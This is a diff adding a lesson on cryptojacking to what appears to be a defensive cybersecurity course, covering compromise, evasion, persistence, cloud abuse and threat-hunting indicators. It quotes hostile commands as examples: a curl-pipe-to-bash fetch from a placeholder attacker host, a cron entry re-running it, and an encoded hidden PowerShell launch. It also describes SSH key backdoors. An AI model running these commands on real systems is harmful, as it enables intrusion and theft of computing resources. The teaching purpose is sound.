@@ -754,7 +754,118 @@ https://attack.mitre.org/techniques/T1055
 
 ---
 
+1.7 RESOURCE HIJACKING
 
+Cryptojacking Tactics Techniques & Procedures
+
+
+Resource hijacking is most commonly seen in cryptojacking used in malware designed to steal computation power and resources. This turns compromised infrastructure into a passive revenue stream for the attacker. As an operative, you cannot afford to dismiss these as mere "annoyance" malware. It's not always just greyware, a PUP or PUA (potentially unwanted program/app). They're just as big of a threat as any other malware type and could wreak havoc in the near future. A threat actor capable of dropping a persistent XMRig miner on a server has the exact same access required to drop a ransomware encryptor or establish a persistent C2 beacon.
+
+
+Let's break down the mechanics, the kill chain, and the tactics, techniques, and procedures (TTPs) associated with modern cryptojacking campaigns.
+
+
+
+The Initial Compromise & Execution
+
+Unlike opportunistic phishing which targets users and tends to be more calculated with who is targeted, cryptojacking often relies on automated scanning to exploit vulnerable, internet-facing services on anything and everything it can get its hands on. This includes unpatched web vulnerabilities, exposed databases, or weak remote access credentials (like RDP on Windows or SSH on Linux).
+
+
+Once access is achieved, the attacker's goal is fast and stealthy execution. They heavily utilize Living off the Land (LotL) techniques meaning they abuse legitimate, built-in system tools rather than bringing in custom and obviously looking programs that antivirus would easily catch. LotL is yet another concept that you'll need to be familiar with. Buzzwords! Yay!
+
+
+
+We haven't really touched on Linux OS at all, but as we expand our knowledge of various know malware and TTP's hackers use we'll have to start understanding how Linux is abused as well. So I'll start to add in some Linux concepts. On Linux servers, attackers often use simple command-line utilities designed for downloading and executing files. Commands like curl to pull files from the internet and bash to execute the files is fairly commonly seen. A standard initial execution payload often looks like this:
+
+
+curl -s http://[malicious_IP]/init.sh | bash
+
+What this does: curl silently downloads a script from the attacker's server (-s flag for silent) and the | symbol "pipes" that script directly into bash, the Linux command-line interpreter, executing it entirely in memory without saving a file to the hard drive.
+
+
+Similarly on Windows systems, PowerShell is the undisputed king of LotL attacks. Attackers use heavily obfuscated PowerShell commands to run fileless malware directly in the system's RAM (memory).
+
+
+powershell.exe -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIgBIADRAcwBJAEEA...
+
+What this does: The flags used here are vital for evasion. -nop bypasses user profile restrictions, -w hidden prevents a command window from popping up on the user's screen, and -enc tells PowerShell to run a Base64 encoded string, which hides the actual malicious commands from simple security scanners.
+
+
+Defense Evasion: Hiding in Plain Sight
+
+A successful cryptojacker requires staying on a computer for as long as possible. If a system admin notices a server or laptop fan constantly screaming and regular system crashes causing everything to crash, well operation steal your resources is over. Operatives must understand how these processes hide. We've already touched on these hiding mechanisms briefly in Lesson 1.2 but lets add on to it.
+
+
+Process Masquerading: As we've covered previously, the mining binary is likely never going to be named miner.exe or crypto.exe. The script renames the executable to blend into normal system noise.
+
+    On Linux: You might see the process masquerading as a core system function like [kworker/u4:2], systemd-networkd, or sshd. Process names you'll become more familiar with in time.
+    On Windows: The miner often injects itself into legitimate Windows processes. An operator might just see a normal-looking svchost.exe (Service Host), taskeng.exe (Task Scheduler Engine), or notepad.exe consuming unusual amounts of resources.
+
+
+Resource Throttling: Advanced miners are configured to avoid pushing the processing power up to 100%. They might throttle usage to 40-50% or only spin up to maximum capacity when no active user sessions are detected (e.g., waiting until a workstation is locked or a server has no active remote desktop connections then go ham).
+
+The Highlander Rule: Attackers want 100% of the stolen resources for themselves. Almost all mining scripts include functions to scan the system and kill other known mining malware from rival hacking groups.
+
+
+Persistence Mechanisms: The Whack-a-Mole Problem
+
+Simply identifying and killing the rogue process is rarely enough. The initial script establishes persistence mechanisms to ensure the miner survives reboots and process termination. Persistence is a concept that you'll have to known intimately for nearly all cybersecurity professions.
+
+
+Linux Persistence:
+
+    Cron Jobs: Attackers write entries to the system's task scheduler (Cron) to re-fetch and execute the malicious script every few minutes (e.g., */5 * * * * curl -s http://[malicious_IP]/init.sh | bash). Unless you delete the Cron job, it will persist and continue to steal resources while also serving as what is likely backdoor access to the computer.
+    SSH Backdoors: Modifying the ~/.ssh/authorized_keys file to include the attacker's public key, guaranteeing re-entry even if the initial vulnerability is patched. Even if you kill the Cron job, they can SSH directly into the computer. Obviously not a great situation to be in.
+
+Windows Persistence:
+
+    Scheduled Tasks: Attackers abuse schtasks.exe to create hidden tasks that launch their PowerShell payload every time a user logs in or at specific time intervals.
+    WMI Event Consumers: Windows Management Instrumentation (WMI) is a powerful administrative framework. Attackers can create hidden WMI subscriptions that trigger the malware to run whenever a specific system event occurs (like system startup). This is highly stealthy and often missed by standard antivirus.
+    Registry Run Keys: Adding the malicious command to the Windows Registry (e.g., HKCU\Software\Microsoft\Windows\CurrentVersion\Run) so it executes automatically upon boot.
+
+
+Windows and Linux both have many methods of persistence mechanisms. Which again, I'd highly recommend reviewing Mitre's Persistence framework:
+
+https://attack.mitre.org/tactics/TA0003/
+
+
+Cloud Cryptojacking: Financial Denial of Service (FDoS)
+
+While compromising a single web server or an office of Windows laptops is profitable, the ultimate jackpot for cryptojackers is cloud infrastructure (AWS, Azure, GCP). Which if you stick around and complete the cloud lessons once available you'll understand exactly why.
+
+
+In the cloud, the objective shifts from utilizing existing compute to provisioning new, massive virtual machines. If attackers can successfully steal cloud identity credentials (IAM keys) and use them to programmatically spin up dozens of incredibly expensive, GPU-optimized instances across multiple geographic regions then you can start to understand how lucrative that could be compared to grandma's old Windows XP device running on 8 GBs of RAM.
+
+
+This results in a Financial Denial of Service. The organization isn't just losing CPU cycles on hardware they own, they are actively billed tens of thousands of dollars by their cloud provider before the anomaly is detected. As you'll learn in the cloud lessons, setting budget alerts to catch these before they exceed as low as 5% more than expected costs is absolutely critical. It's easy to setup and really no excuse for cloud engineers to not put in. Shame on you if you don't monitor your resource usage.
+
+
+Operative Takeaways & Threat Hunting
+
+To effectively hunt for resource hijacking operatives should focus on the following Indicators of Compromise (IoCs) and behavioral anomalies across all OS platforms:
+
+    Network Anomalies (The Stratum Protocol): Miners don't typically use standard web traffic (HTTP/HTTPS). They use JSON-RPC over raw TCP with native mining software typically using long-lasting TCP connections, running the Stratum protocol. Hunt for unexpected outbound connections from servers or workstations to known mining pool ports (e.g., 3333, 4444, 5555, 14444).
+    DNS Queries: Monitor DNS logs for requests resolving to known mining pools (e.g., pool.supportxmr.com, xmr.crypto-pool.fr).
+    Sustained Resource Usage: Utilize endpoint monitoring alerts for sustained, unexplained CPU or GPU spikes, especially during off-peak hours or from system processes that normally use very little memory (like svchost.exe).
+    LotL Abuse: Alert on anomalous usage of command-line tools. A web server executing curl to an unknown IP or a Windows workstation executing an encoded PowerShell command (-enc), warrants immediate investigation.
+
+Understanding cryptojacking is about understanding persistence, evasion, and the monetization of compute power. Master identifying these TTPs and you will be significantly faster at identifying and stopping stealthy footholds within any network like a master operative.
+
+
+
+If you don't already have a solid list of cybersecurity news websites to keep up with the times might I recommend adding The Hacker News & Bleeping Computer to your list. As a cybersecurity professional, it's imperative that you continue to keep up with the latest trends. Even if you're just starting out, many news articles don't require you to understand overly technical concepts and will give a high level overview of new emerging threats across the world. The reason I bring this up now, is there's a couple articles you may find interesting to further expand your knowledge of cryptojackers.
+
+
+A general overview of cryptocurrency mining and how it works:
+
+https://thehackernews.com/2018/02/cryptocurrency-mining-threat.html
+
+Another cloud based crypto mining attack involving Docker which is a very popular containerization platform where you can run whatever you want in publically accessible "containers":
+
+https://thehackernews.com/2025/06/hackers-exploit-misconfigured-docker.html
+
+
+---
 
 
 
